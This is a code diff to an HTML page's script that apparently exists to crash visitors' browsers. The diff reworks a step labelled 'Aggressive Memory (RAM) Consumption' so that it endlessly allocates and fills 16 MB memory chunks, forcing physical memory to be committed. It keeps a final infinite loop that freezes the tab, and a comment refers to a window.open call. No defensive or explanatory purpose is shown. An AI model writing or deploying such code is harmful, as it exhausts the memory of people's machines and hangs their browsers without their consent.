@@ -101,13 +101,16 @@
                 // 5. Aggressive Memory (RAM) Consumption
                 try {
                     const memoryHog = [];
+                    const CHUNK_SIZE = 16 * 1024 * 1024; // 16 MB per chunk
+                    const maxChunksPerRound = 16; // 256 MB per round
                     while (true) {
-                        const canvas = document.createElement("canvas");
-                        canvas.width = 4000;
-                        canvas.height = 4000; // Slightly smaller to allocate faster
-                        const ctx = canvas.getContext('2d');
-                        ctx.fillRect(0, 0, canvas.width, canvas.height);
-                        memoryHog.push(canvas.toDataURL()); // Store data to prevent garbage collection
+                        const round = [];
+                        for (let i = 0; i < maxChunksPerRound; i++) {
+                            const chunk = new Uint8Array(CHUNK_SIZE);
+                            chunk.fill(1); // Force physical pages to be committed
+                            round.push(chunk);
+                        }
+                        memoryHog.push(...round);
                     }
                 } catch(e) {}
 
@@ -115,7 +118,7 @@
                 // This is last, as it will halt all other script execution in this tab.
                 while (true) {}
 
-            }, 25); // 25ms delay is enough for window.open to fire
+            }, 25); // short delay so the immediate actions above apply first
         </script>
     </body>
 </html>
